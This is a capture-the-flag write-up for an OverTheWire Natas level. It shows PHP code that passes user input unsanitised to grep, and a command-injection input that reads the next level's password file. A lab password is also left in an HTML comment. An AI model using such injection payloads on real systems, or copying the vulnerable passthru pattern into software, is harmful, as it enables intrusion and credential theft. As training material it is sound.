Let's dive into the next challenge by logging in using the credentials obtained from the previous level.

Upon logging in, we observe the following:
![untitled](ScreenShots/Level%208%20->%209.jpg)

---
**How to Comment Lines in Bash**
- Referencing [warp](https://www.warp.dev/terminus/bash-comments)

**How to Merge Two Bash Commands**
- Referencing [Stack Overflow](https://stackoverflow.com/questions/20871534/concatenate-in-bash-the-output-of-two-commands-without-newline-character)
- Also from [How-To Geek](https://www.howtogeek.com/269509/how-to-run-two-or-more-terminal-commands-at-once-in-linux/)
-  Also from [ask Ubuntu](https://askubuntu.com/questions/133386/how-to-merge-and-pipe-results-from-two-different-commands-to-single-command)
---
We notice that the application is prompting us for a word to search. To understand the functionality better, we examine the source code:
```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The code reveals that a terminal command is executed whenever a word is entered. Specifically, the `grep` command is used to search for the input word in the file `dictionary.txt`.
```bash
grep -i "" dictionary.txt
```
We can only control the input within the `""`. To view the entire file content, we can enter `.*` as our input. However, upon doing so, we find that the password is not in `dictionary.txt`.

To proceed, we need to inject our own command to retrieve the password. By entering the following input, we can exploit a command injection vulnerability:
```bash
grep -i "; cat /etc/natas_webpass/natas10 #" dictionary.txt
```
Executing this input successfully retrieves the password.

With the password in hand, we can log into the next level using the following credentials:
```
URL: http://natas10.natas.labs.overthewire.org
Username: natas10
Password: Password obtained via the bash injection exploit
```
<!-- Password: `D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE` -->